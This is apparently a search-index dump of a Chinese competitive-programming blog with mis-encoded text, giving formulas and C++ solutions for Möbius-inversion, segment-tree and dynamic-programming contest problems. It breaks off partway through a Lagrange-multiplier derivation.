æ­¤æ—¶å°±å¯ä»¥å¥—ç”¨å®Œå…¨å¹³æ–¹æ•°è¿™ä¸ªé¢˜çš„å…¬å¼ $$ \\sum_{i=1}^{n} \\mu^2(i)=\\sum_{i=1} ^{n}\\sum_{d^2 \\mid i} \\mu(d) $$ ä»£å…¥å¯å¾— $$ \\sum_{i = 1} ^ {n} \\lfloor \\frac{n}{i} \\rfloor \\sum_{d ^ 2 \\mid i} \\mu(d) $$ äº¤æ¢æ±‚å’Œæ¬¡åº $$ \\sum_{d = 1} ^ {\\sqrt n} \\mu(d) \\sum_{i = 1} ^ {\\lfloor \\frac{n}{d ^ 2} \\rfloor} \\lfloor \\frac{n}{i \\times d ^ 2} \\rfloor = \\sum_{d = 1} ^ {\\sqrt n} \\mu(d) \\sum_{i = 1} ^ {\\lfloor \\frac{n}{d ^ 2} \\rfloor} \\lfloor \\frac{\\lfloor \\frac{n}{d ^ 2} \\rfloor}{i} \\rfloor $$ åé¢å¼å­ç›´æ¥åˆ†å—å³å¯ï¼Œæ³¨æ„ä¼˜åŒ–å½“è«æ¯”ä¹Œæ–¯å‡½æ•°é $0$ æ—¶æ‰è®¡ç®—ç­”æ¡ˆï¼Œå¹¶ä¸”åˆ†å—è¦è®°å¿†åŒ–ä¸€ä¸‹ç­”æ¡ˆï¼Œå¤æ‚åº¦æ¯”è¾ƒç„å­¦ï¼Œæ­¤é¢˜ç»™äº† $15$ ç§’ã€‚ ","date":"2022-07-15","objectID":"/posts/cp2016-ccpc-%E6%9D%AD%E5%B7%9Ej-just-a-math-problem/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[2016 CCPC æ­å·J] Just a Math Problem","uri":"/posts/cp2016-ccpc-%E6%9D%AD%E5%B7%9Ej-just-a-math-problem/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int mod = 1e9 + 7; int cnt; vector\u003cint\u003e primes(1e6 + 1), mobius(1e6 + 1), block(1e6 + 1); vector\u003cbool\u003e st(1e6 + 1); void init(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; i * primes[j] \u003c= n; j ++) { int t = i * primes[j]; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } }; void solve() { int n; cin \u003e\u003e n; int res = 0; auto sum = [\u0026](int n) { if (n \u003c 1e6 \u0026\u0026 block[n]) { return block[n]; } int res = 0; for (int l = 1, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res + (n / l) * (r - l + 1) % mod) % mod; } if (n \u003e 1e6) { return res; } else { return block[n] = res; } }; for (int i = 1; i * i \u003c= n; i ++) { if (mobius[i]) { res = (res + mobius[i] * sum(n / (i * i)) % mod + mod) % mod; } } cout \u003c\u003c res \u003c\u003c \"\\n\"; } signed main() { init(1e6); cin.tie(0) -\u003e sync_with_stdio(0); int T; cin \u003e\u003e T; for (int t = 1; t \u003c= T; t ++) { cout \u003c\u003c \"Case #\" \u003c\u003c t \u003c\u003c \": \"; solve(); } } ","date":"2022-07-15","objectID":"/posts/cp2016-ccpc-%E6%9D%AD%E5%B7%9Ej-just-a-math-problem/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[2016 CCPC æ­å·J] Just a Math Problem","uri":"/posts/cp2016-ccpc-%E6%9D%AD%E5%B7%9Ej-just-a-math-problem/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸¤ä¸ªæ­£æ•´æ•° $q, d$ï¼Œå®šä¹‰ä¸‰å…ƒç»„ $(i, j, k)$ æ»¡è¶³ $i \u003c j \u003c k, k - i \\le d$ï¼Œä¸ºç¾ä¸½ä¸‰å…ƒç»„ï¼Œç°åœ¨æœ‰ä¸€ä¸ªç©ºé›†å’Œ $q$ ç»„è¯¢é—®ï¼Œæ¯æ¬¡ç»™å®šä¸€ä¸ªæ­£æ•´æ•° $x$ï¼Œè‹¥ $x$ ä¸åœ¨é›†åˆï¼Œé‚£ä¹ˆå°† $x$ åŠ å…¥é›†åˆï¼Œè‹¥ $x$ åœ¨é›†åˆä¸­ï¼Œé‚£ä¹ˆå°† $x$ ä»é›†åˆä¸­åˆ é™¤ï¼Œæ¯æ¬¡è¯¢é—®è®¡ç®—é›†åˆä¸­ç¾ä¸½ä¸‰å…ƒç»„çš„ä¸ªæ•°ã€‚ åˆ†æï¼š è€ƒè™‘æ¯ä¸ªæ•°ä»é›†åˆåŠ å…¥æˆ–åˆ é™¤çš„è´¡çŒ®ï¼Œå¯¹äºä¸€ä¸ªæ•° $x$ï¼Œä»åŒºé—´ $[x, x + d]$ ä¸­é€‰å‡ºä»»æ„ä¸¤ä¸ªä¸åŒçš„æ•°éƒ½å¯ä»¥ç»„æˆç¾ä¸½ä¸‰å…ƒç»„(å‡è®¾ $x$ ä¸ºä¸‰å…ƒç»„ä¸­çš„æœ€å°å€¼)ï¼Œè®°åŒºé—´ä¸­åœ¨é›†åˆçš„æ•°é‡ä¸º $cnt$ï¼Œé‚£ä¹ˆæ–¹æ¡ˆæ•°ä¸º $\\dbinom{cnt}{2}$ï¼Œé‚£ä¹ˆè€ƒè™‘åŒºé—´ $[x - d, x - 1]$ï¼Œå¯¹åŒºé—´ä¸­çš„æ¯ä¸ªæ•° $i$ï¼Œè€ƒè™‘ $x$ åŠ å…¥åçš„å½±å“ï¼Œè®¾åŒºé—´ $[i, i + d]$ åœ¨é›†åˆä¸­çš„ä¸ªæ•°ä¸º $a_i$ï¼Œé‚£ä¹ˆç¾ä¸½ä¸‰å…ƒç»„çš„ä¸ªæ•°ä¸º $\\dbinom{a_i}{2}$ï¼Œåˆ™ $x$ åŠ å…¥åçš„ç¾ä¸½ä¸‰å…ƒç»„æ•°é‡ä¸º $\\dbinom{a_i + 1}{2}$ï¼Œè®¾æ•´ä¸ªé›†åˆä¸º $S$ï¼Œé‚£ä¹ˆåœ¨åŒºé—´ $[x - d, x - 1]$ ä¸­æ–°å¢çš„ç¾ä¸½ä¸‰å…ƒç»„æ•°é‡å°±ä¸º $\\sum\\limits_{i = x - d} ^ {x - 1} \\left (\\dbinom{a_i + 1}{2} - \\dbinom{a_i}{2} \\right ) [i \\in S] = \\sum\\limits_{i = x - d} ^ {x - 1}a_i [i \\in S]$ï¼Œå¯¹äº $x$ åˆ é™¤åçš„å½±å“å°±ä¸º $\\sum\\limits_{i = x - d} ^ {x - 1} \\left (\\dbinom{a_i}{2} - \\dbinom{a_i - 1}{2} \\right ) [i \\in S] = \\sum\\limits_{i = x - d} ^ {x - 1} (a_i - 1) [i \\in S]$ è€ƒè™‘ä½¿ç”¨çº¿æ®µæ ‘ï¼Œæˆ‘ä»¬é‡ç‚¹è¦ç»´æŠ¤çš„æ˜¯æ¯ä¸ªæ•° $x$ åœ¨åŒºé—´ $[x, x + d]$ ä¸­åœ¨é›†åˆé‡Œçš„ä¸ªæ•°ï¼Œé‚£ä¹ˆæ¯æ¬¡åŠ å…¥æˆ–åˆ é™¤æ“ä½œå°±ç›¸å½“äºå¯¹åŒºé—´ $[x - d, x - 1]$ è¿›è¡ŒåŒºé—´ $+1$ æˆ– $-1$ æ“ä½œï¼Œçº¿æ®µæ ‘ä¸­ç»´æŠ¤å››ä¸ªå€¼ï¼š$\\text{cnt}$ ä»£è¡¨åŒºé—´é‡Œåœ¨é›†åˆä¸­çš„æ•°çš„ä¸ªæ•°ï¼Œ$\\text{add}$ ä»£è¡¨åŒºé—´åŠ çš„æ‡’æ ‡è®°ï¼Œ$\\text{val}$ ä»£è¡¨æ¯ä¸ªæ•° $i$ åœ¨åŒºé—´ $[i, i + d]$ ä¸­åœ¨é›†åˆé‡Œçš„ä¸ªæ•°ï¼Œ$\\text{sum}$ ä»£è¡¨å­˜åœ¨é›†åˆä¸­çš„æ¯ä¸ªæ•° $i$ åœ¨åŒºé—´ $[i, i + d]$ ä¸­åœ¨é›†åˆé‡Œçš„ä¸ªæ•°ã€‚å› ä¸ºæ¯ä¸ªæ•°æ˜¯å¦å­˜åœ¨äºé›†åˆä¸­ç”± $\\text{cnt}$ æ˜¯å¦ä¸º $1$ æ¥å†³å®šï¼Œç›¸å½“äº $\\text{val}$ æ˜¯å…¨éƒ¨çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æ— è®ºåŒºé—´ $[x - d, x - 1]$ çš„æŸä¸ªæ•°å­˜ä¸å­˜åœ¨äºé›†åˆï¼Œæˆ‘ä»¬éƒ½è¦ç»´æŠ¤ï¼Œé‚£ä¹ˆçœŸæ­£çš„ç­”æ¡ˆæ˜¯ $\\text{sum}$ï¼Œä¹Ÿå°±æ˜¯é‚£äº›å­˜åœ¨äºé›†åˆé‡Œçš„æ•°çš„å€¼ï¼Œé€šè¿‡æ‡’æ ‡è®°ç”¨ $\\text{cnt} \\times \\text{val}$ æ¥ä¸‹ä¼ ï¼Œè¿™æ ·å°±å·§å¦™åœ°ç®—å‡ºäº†ä¸€æ®µåŒºé—´å­˜åœ¨äºé›†åˆä¸­çš„æ•°å¯¹ç­”æ¡ˆçš„è´¡çŒ®ï¼Œè‡³äºåŒºé—´ $[x, x + d]$ çš„è´¡çŒ®å¯ä»¥ç›´æ¥æŸ¥è¯¢ $\\text{val}_x$ çš„å•ç‚¹å€¼å¹¶ç»™ç­”æ¡ˆè´¡çŒ® $\\dbinom{\\text{val}_x}{2}$ ","date":"2022-07-13","objectID":"/posts/cpeducational-codeforces-round-131-f-points/:0:0","tags":["ç»„åˆè®¡æ•°","çº¿æ®µæ ‘"],"title":"[Educational Codeforces Round 131 F] Points","uri":"/posts/cpeducational-codeforces-round-131-f-points/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; constexpr int N = 2e5; struct SegmentTree { struct Info { int l, r, cnt, add, val, sum; }; vector\u003cInfo\u003e tr; SegmentTree(int n) : tr(n \u003c\u003c 2) { function\u003cvoid(int, int, int)\u003e build = [\u0026](int u, int l, int r) { if (l == r) { tr[u] = {l, r}; } else { tr[u] = {l, r}; int mid = l + r \u003e\u003e 1; build(u \u003c\u003c 1, l, mid), build(u \u003c\u003c 1 | 1, mid + 1, r); pushup(u); } }; build(1, 1, n); } void pushdown(int u) { if (tr[u].add) { tr[u \u003c\u003c 1].add += tr[u].add, tr[u \u003c\u003c 1 | 1].add += tr[u].add; tr[u \u003c\u003c 1].val += (tr[u \u003c\u003c 1].r - tr[u \u003c\u003c 1].l + 1) * tr[u].add; tr[u \u003c\u003c 1 | 1].val += (tr[u \u003c\u003c 1 | 1].r - tr[u \u003c\u003c 1 | 1].l + 1) * tr[u].add; tr[u \u003c\u003c 1].sum += tr[u \u003c\u003c 1].cnt * tr[u].add; tr[u \u003c\u003c 1 | 1].sum += tr[u \u003c\u003c 1 | 1].cnt * tr[u].add; tr[u].add = 0; } } void pushup(int u) { tr[u].cnt = tr[u \u003c\u003c 1].cnt + tr[u \u003c\u003c 1 | 1].cnt; tr[u].val = tr[u \u003c\u003c 1].val + tr[u \u003c\u003c 1 | 1].val; tr[u].sum = tr[u \u003c\u003c 1].sum + tr[u \u003c\u003c 1 | 1].sum; } void modifycnt(int u, int pos, int c) { if (!pos) return ; if (tr[u].l == tr[u].r) { tr[u].cnt += c; if (!tr[u].cnt) { tr[u].sum = 0; } else { tr[u].sum = tr[u].val; } return ; } pushdown(u); int mid = tr[u].l + tr[u].r \u003e\u003e 1; if (pos \u003c= mid) { modifycnt(u \u003c\u003c 1, pos, c); } else { modifycnt(u \u003c\u003c 1 | 1, pos, c); } pushup(u); } void modifysum(int u, int l, int r, int c) { if (l \u003e r) return ; if (tr[u].l \u003e= l \u0026\u0026 tr[u].r \u003c= r) { tr[u].val += (tr[u].r - tr[u].l + 1) * c; tr[u].sum += tr[u].cnt * c; tr[u].add += c; return ; } pushdown(u); int mid = tr[u].l + tr[u].r \u003e\u003e 1; if (l \u003c= mid) modifysum(u \u003c\u003c 1, l, r, c); if (r \u003e mid) modifysum(u \u003c\u003c 1 | 1, l, r, c); pushup(u); } int askval(int u, int pos) { if (!pos) return 0; if (tr[u].l == tr[u].r) return tr[u].val; pushdown(u); int mid = tr[u].l + tr[u].r \u003e\u003e 1, res = 0; if (pos \u003c= mid) { return askval(u \u003c\u003c 1, pos); } else { return askval(u \u003c\u003c 1 | 1, pos); } } int asksum(int u, int l, int r) { if (l \u003e r) return 0; if (tr[u].l \u003e= l \u0026\u0026 tr[u].r \u003c= r) return tr[u].sum; pushdown(u); int mid = tr[u].l + tr[u].r \u003e\u003e 1, res = 0; if (l \u003c= mid) res += asksum(u \u003c\u003c 1, l, r); if (r \u003e mid) res += asksum(u \u003c\u003c 1 | 1, l, r); return res; } }; signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int n, d; cin \u003e\u003e n \u003e\u003e d; vector\u003cint\u003e st(N + 1); SegmentTree tr(N + 1); int ans = 0; for (int i = 1; i \u003c= n; i ++) { int x; cin \u003e\u003e x; int l = max(1ll, x - d), r = x - 1; if (!st[x]) { ans += tr.asksum(1, l, r); tr.modifysum(1, l, r, 1); int cnt = tr.askval(1, x); ans += cnt * (cnt - 1) / 2; tr.modifycnt(1, x, 1); } else if (st[x]) { tr.modifysum(1, l, r, -1); ans -= tr.asksum(1, l, r); int cnt = tr.askval(1, x); ans -= cnt * (cnt - 1) / 2; tr.modifycnt(1, x, -1); } st[x] ^= 1; cout \u003c\u003c ans \u003c\u003c \"\\n\"; } } ","date":"2022-07-13","objectID":"/posts/cpeducational-codeforces-round-131-f-points/:1:0","tags":["ç»„åˆè®¡æ•°","çº¿æ®µæ ‘"],"title":"[Educational Codeforces Round 131 F] Points","uri":"/posts/cpeducational-codeforces-round-131-f-points/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"èƒŒåŒ…ï¼šAcwing 1454 å¼‚æˆ–å’Œæ˜¯è´¨æ•°çš„å­é›†æ•° é¢˜ç›®é“¾æ¥ https://www.acwing.com/problem/content/description/1456/ åˆ†æï¼š è€ƒè™‘ $01$ èƒŒåŒ…ï¼Œ$1 \\sim n$ ä¸­å¯¹äºæ¯ä»¶ç‰©å“ $1 \\le i \\le n$ çš„ä½“ç§¯ä¸º $i$ å®šä¹‰çŠ¶æ€ $dp_{i, j}$ ä¸ºä»å‰ $i$ ä»¶ç‰©å“ä¸­é€‰ï¼Œå¼‚æˆ–å’Œä¸º $j$ çš„æ–¹æ¡ˆæ•°ï¼Œé‚£ä¹ˆæœ‰è½¬ç§» $$ dp_{i,j} = dp_{i - 1,j} + dp_{i - 1,j \\oplus a_i} $$ ç”±äºæŒ‰ä½å¼‚æˆ–ä¼šå˜å°ï¼Œæ‰€ä»¥çŠ¶æ€å¿…é¡»å¼€äºŒç»´ï¼Œä½†ç¬¬ä¸€ç»´å¯ä»¥ç”¨æ»šåŠ¨æ•°ç»„ä¼˜åŒ–ã€‚ æ³¨æ„åˆ° $1 \\le a_i \\le 5 \\times 10 ^ 3$ï¼Œ$2 ^ {12} = 4096 \u003c 5 \\times 10 ^ 3$ï¼Œæ‰€ä»¥æ€»ä½“ç§¯æœ€å¤§ä¸º $\\sum_{i = 0} ^ {12} 2 ^ i = 2 ^ {13} - 1$ é‚£ä¹ˆæœ€åçš„ç­”æ¡ˆä¸º $$ \\sum_{i \\in \\text{prime}} dp_i $$ æ—¶é—´å¤æ‚åº¦ $O(2 ^{13} \\times n)$ ","date":"2022-07-07","objectID":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:1:0","tags":["DP"],"title":"DP é¢˜ç›®é€‰è®²","uri":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #pragma GCC optimize(2) #pragma GCC optimize(3) #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int mod = 1e9 + 7, N = 1 \u003c\u003c 13; signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int cnt = 0; vector\u003cint\u003e primes(N + 1); vector\u003cbool\u003e st(N + 1); auto sieve = [\u0026](int n) { st[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; } for (int j = 0; i * primes[j] \u003c= n; j ++) { int t = i * primes[j]; st[t] = 1; if (i % primes[j] == 0) { break; } } } }; sieve(N); int n; cin \u003e\u003e n; vector\u003cint\u003e a(n + 1); for (int i = 1; i \u003c= n; i ++) { cin \u003e\u003e a[i]; } vector\u003cvector\u003cint\u003e\u003e dp(2, vector\u003cint\u003e(N + 1)); dp[0][0] = 1; for (int i = 1; i \u003c= n; i ++) { for (int j = 0; j \u003c= N; j ++) { dp[i \u0026 1][j] = dp[(i - 1) \u0026 1][j]; if ((j ^ a[i]) \u003c= N) { dp[i \u0026 1][j] = (dp[i \u0026 1][j] + dp[(i - 1) \u0026 1][j ^ a[i]]) % mod; } } } int res = 0; for (int i = 1; i \u003c= N; i ++) { if (!st[i]) { res = (res + dp[n \u0026 1][i]) % mod; } } cout \u003c\u003c res \u003c\u003c \"\\n\"; } ","date":"2022-07-07","objectID":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:2:0","tags":["DP"],"title":"DP é¢˜ç›®é€‰è®²","uri":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŒºé—´DPï¼šCF 1114 D Flood Fill é¢˜ç›®é“¾æ¥ https://codeforces.com/problemset/problem/1114/D é¢˜æ„ï¼š æœ‰ $n$ ä¸ªç –å—æ’æˆä¸€æ’ï¼Œä»å·¦åˆ°å³ç¼–å·ä¸º $1 \\sim n$ å…¶ä¸­ï¼Œç¬¬ $i$ ä¸ªç –å—çš„åˆå§‹é¢œè‰²ä¸º $c_i$ æˆ‘ä»¬è§„å®šï¼Œå¦‚æœç¼–å·èŒƒå›´ $[i,j]$ å†…çš„æ‰€æœ‰ç –å—çš„é¢œè‰²éƒ½ç›¸åŒï¼Œåˆ™ç –å— $i$ å’Œ $j$ å±äºåŒä¸€ä¸ªè¿é€šå—ã€‚ ç°åœ¨ï¼Œè¦å¯¹ç –å—è¿›è¡Œæ¶‚è‰²æ“ä½œã€‚ å¼€å§‹æ‰€æœ‰æ“ä½œä¹‹å‰ï¼Œä½ éœ€è¦ä»»é€‰ä¸€ä¸ªç –å—ä½œä¸ºèµ·å§‹ç –å—ã€‚ æ¯æ¬¡æ“ä½œï¼š ä»»é€‰ä¸€ç§é¢œè‰²ã€‚ å°†æœ€å¼€å§‹é€‰å®šçš„èµ·å§‹ç –å—æ‰€åœ¨è¿é€šå—ä¸­åŒ…å«çš„æ‰€æœ‰ç –å—éƒ½æ¶‚ä¸ºé€‰å®šé¢œè‰²ï¼Œ è¯·é—®ï¼Œè‡³å°‘éœ€è¦å¤šå°‘æ¬¡æ“ä½œï¼Œæ‰èƒ½ä½¿æ‰€æœ‰ç –å—éƒ½å…·æœ‰åŒä¸€ç§é¢œè‰²ã€‚ åˆ†æï¼š é¦–å…ˆæŠŠæ‰€æœ‰ç –å—è¿›è¡Œç¼©ç‚¹ï¼Œä¹Ÿå°±æ˜¯ç›¸é‚»ç›¸åŒé¢œè‰²çš„ç –å—è¿›è¡Œåˆå¹¶ã€‚ è€ƒè™‘åŒºé—´ DPï¼Œå®šä¹‰çŠ¶æ€ $dp_{i, j}$ ä¸ºå°†åŒºé—´ $[i, j]$ æŸ“æˆåŒè‰²çš„æœ€å°æ¬¡æ•°ï¼Œè½¬ç§»åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š å¯¹äºæ¯ä¸ªåŒºé—´ $[l, r]$ï¼Œæ¯ä¸ªç«¯ç‚¹ $i$ çš„é¢œè‰²ä¸º $a_i$ è‹¥ $a_l = a_r$ï¼Œé‚£ä¹ˆ $dp_{l, r} = dp_{l + 1, r - 1} + 1$ è‹¥ $a_l \\ne a_r$ï¼Œé‚£ä¹ˆ $dp_{l, r} = \\min(dp_{l + 1, r}, dp_{l, r - 1}) + 1$ æœ€ç»ˆç­”æ¡ˆä¸º $dp_{1, n}$ æ—¶é—´å¤æ‚åº¦ $O(n ^ 2)$ ","date":"2022-07-07","objectID":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:3:0","tags":["DP"],"title":"DP é¢˜ç›®é€‰è®²","uri":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int n; cin \u003e\u003e n; vector\u003cint\u003e a{0}; for (int i = 1; i \u003c= n; i ++) { int x; cin \u003e\u003e x; if (a.back() != x) { a.push_back(x); } } n = a.size() - 1; vector\u003cvector\u003cint\u003e\u003e dp(n + 1, vector\u003cint\u003e(n + 1)); for (int len = 2; len \u003c= n; len ++) { for (int l = 1; l + len - 1 \u003c= n; l ++) { int r = l + len - 1; if (a[l] == a[r]) { dp[l][r] = dp[l + 1][r - 1] + 1; } else { dp[l][r] = min(dp[l + 1][r], dp[l][r - 1]) + 1; } } } cout \u003c\u003c dp[1][n] \u003c\u003c endl; } ","date":"2022-07-07","objectID":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:4:0","tags":["DP"],"title":"DP é¢˜ç›®é€‰è®²","uri":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ•°ä½DPï¼šæ´›è°· P2657 windy æ•° é¢˜ç›®é“¾æ¥ https://www.luogu.com.cn/problem/P2657 æ•°ä½ DP å­¦ä¹ ç¬”è®°ï¼šhttps://www.acwing.com/blog/content/7944/ é¢˜æ„ï¼š æ‰¾åˆ°åŒºé—´ $[L,R]$ ç›¸é‚»æ•°å­—ä¹‹å·®è‡³å°‘ä¸º $2$ çš„æ•°çš„ä¸ªæ•° åˆ†æï¼š æœç´¢åˆå§‹æ¡ä»¶ç¬¬äºŒä¸ªå‚æ•° $pre$ å¿…é¡»å¡«ä¸€ä¸ª $\\le -2$ çš„æ•°æ¥ä¿è¯å¯ä»¥æœç´¢ä¸‹å»ï¼Œä¸ç„¶ä¼šå‡ºé”™ã€‚æ­¤é¢˜éœ€è¦è®°å½•å‰å¯¼é›¶ï¼Œä¸ç„¶å¿½è§†å‰å¯¼é›¶çš„å½±å“ä¼šé€ æˆæœ€é«˜ä½æ•° $-0\u003c2$ æ— æ³•ç»§ç»­æœç´¢çš„æƒ…å†µã€‚ ","date":"2022-07-07","objectID":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:5:0","tags":["DP"],"title":"DP é¢˜ç›®é€‰è®²","uri":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int l, r; cin \u003e\u003e l \u003e\u003e r; auto cal = [\u0026](int x) { vector\u003cint\u003e a{0}; while (x) { a.push_back(x % 10); x /= 10; } vector\u003cvector\u003cint\u003e\u003e dp(a.size(), vector\u003cint\u003e(10, -1)); function\u003cint(int, int, int, int)\u003e dfs = [\u0026](int pos, int pre, int lead, int limit) { if (!pos) return 1ll; if (!limit \u0026\u0026 !lead \u0026\u0026 dp[pos][pre] != -1) return dp[pos][pre]; int res = 0, up = limit ? a[pos] : 9; for (int i = 0; i \u003c= up; i ++) { if (abs(pre - i) \u003c 2) continue; if (lead \u0026\u0026 !i) { res += dfs(pos - 1, -2, lead \u0026\u0026 !i, limit \u0026\u0026 i == up); } else { res += dfs(pos - 1, i, lead \u0026\u0026 !i, limit \u0026\u0026 i == up); } } return limit ? res : (lead ? res : dp[pos][pre] = res); }; return dfs(a.size() - 1, -2, 1, 1); }; cout \u003c\u003c cal(r) - cal(l - 1) \u003c\u003c \"\\n\"; } ","date":"2022-07-07","objectID":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:6:0","tags":["DP"],"title":"DP é¢˜ç›®é€‰è®²","uri":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"çŠ¶å‹ + æ ‘å½¢DPï¼šæ­¦æ±‰ç§‘æŠ€å¤§å­¦æ ¡èµ› B æ°å“¥çš„æ ‘ é¢˜ç›®é“¾æ¥ https://ac.nowcoder.com/acm/contest/35746/B åˆ†æï¼š é¦–å…ˆè¾¹æƒåªæœ‰ $6$ ç§é¢œè‰²å¯ä»¥æƒ³åˆ°çŠ¶æ€å‹ç¼©ï¼Œè·¯å¾„çš„æ‰€æœ‰é¢œè‰²å¿…é¡»å‡ºç°å¶æ•°æ¬¡ï¼Œå¯ä»¥æƒ³åˆ°æŒ‰ä½å¼‚æˆ–æ“ä½œï¼Œæ¯æ¬¡å¢åŠ é¢œè‰²æ—¶ä»¤å½“å‰çŠ¶æ€å¼‚æˆ– $2 ^ i$ï¼Œ$i$ ä¸ºè¯¥é¢œè‰²å¯¹åº”çš„äºŒè¿›åˆ¶ä½ã€‚ æ¯ç§é¢œè‰²éƒ½å‡ºç°å¶æ•°æ¬¡å°±å¯¹åº” $0$ è¿™ä¸ªçŠ¶æ€ï¼Œé‚£ä¹ˆåªæœ‰ä¸¤ä¸ªçŠ¶æ€ç›¸åŒæ—¶æ‰å¯ä»¥å¼‚æˆ–æˆä¸º $0$ï¼Œå®šä¹‰æ¯ä¸ªç‚¹ $u$ çš„ç‚¹æƒä¸ºä» $1$ åˆ° $u$ çš„å¼‚æˆ–å’Œï¼Œé—®é¢˜å°±è½¬åŒ–ä¸ºæ ‘ä¸Šæœ‰å¤šå°‘ç‚¹å¯¹ç‚¹æƒç›¸åŒã€‚ç›´æ¥ $\\text{dfs}$ éå†ä¸€éæ ‘è®°å½•çŠ¶æ€ï¼Œ$dp_i$ å°±ä¸ºçŠ¶æ€ $i$ çš„ä¸ªæ•°ï¼Œé‚£ä¹ˆæœ€åç­”æ¡ˆå°±ä¸º $$ \\sum_{i = 0} ^ {2 ^ 6} \\binom{dp_i}{2} $$ ","date":"2022-07-07","objectID":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:7:0","tags":["DP"],"title":"DP é¢˜ç›®é€‰è®²","uri":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; signed main() { cin.tie(0) -\u003e sync_with_stdio(0); int n; cin \u003e\u003e n; vector\u003cvector\u003cpair\u003cint, int\u003e\u003e\u003e g(n + 1); for (int i = 1; i \u003c n; i ++) { int u, v; char ch; cin \u003e\u003e u \u003e\u003e v \u003e\u003e ch; g[u].push_back({v, ch - 'a'}), g[v].push_back({u, ch - 'a'}); } vector\u003cint\u003e dp(1ll \u003c\u003c 6); function\u003cvoid(int, int, int)\u003e dfs = [\u0026](int u, int fa, int st) { dp[st] ++; for (auto [v, w] : g[u]) { if (v == fa) { continue; } dfs(v, u, st ^ (1ll \u003c\u003c w)); } }; dfs(1, -1, 0); int res = 0; for (int i = 0; i \u003c 1ll \u003c\u003c 6; i ++) { res += dp[i] * (dp[i] - 1) / 2; } cout \u003c\u003c res \u003c\u003c \"\\n\"; } ","date":"2022-07-07","objectID":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/:8:0","tags":["DP"],"title":"DP é¢˜ç›®é€‰è®²","uri":"/posts/cpdp-%E9%A2%98%E7%9B%AE%E9%80%89%E8%AE%B2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜æ„ æ±‚åœ¨æ»¡è¶³ $\\sum\\limits_{i = 1} ^ {k}\\dfrac{x_i ^ 2}{a_i ^ 2} = 1$ çš„æ¡ä»¶ä¸‹ï¼Œä»é•¿åº¦ä¸º $m$ çš„æ•°ç»„ $b$ ä¸­é€‰ $k$ ä¸ªæ•°ç»„æˆ $a_1,a_2,\\cdots,a_k$ï¼Œ$\\prod\\limits_{i = 1} ^{k} x_i$ çš„æœ€å¤§å€¼çš„æœŸæœ›ï¼Œ$k$ ä¸ºå¶æ•°ã€‚ $(1 \\le k \\le m \\le 10 ^ 5, 0 \u003c b_i \u003c 10 ^ 9)$ åˆ†æï¼š é¦–å…ˆæ±‚è§£æœ€å¤§å€¼éœ€è¦ç”¨åˆ°é«˜ç­‰æ•°å­¦ä¸­å¤šå…ƒå‡½æ•°æ¡ä»¶æå€¼çš„æ‹‰æ ¼æœ—æ—¥ä¹˜æ•°æ³•ï¼Œè®¾ $$ L(x_1,x_2,\\cdots,x_k, \\lambda) = \\prod_{i = 1} ^{k} x_i + \\lambda(\\sum\\limits_{i = 1} ^ {k}\\dfrac{x_i ^ 2}{a_i ^ 2} - 1) $$ å¯¹æ¯ä¸ªå˜é‡æ±‚åå¯¼æ•°ï¼Œä»¤åå¯¼æ•°ä¸º $0$ å¾— $$ \\frac{\\partial L}{\\partial x_1} = \\frac{\\prod\\limits_{i = 1} ^{k} x_i}{x_1} + \\frac{2\\lambda 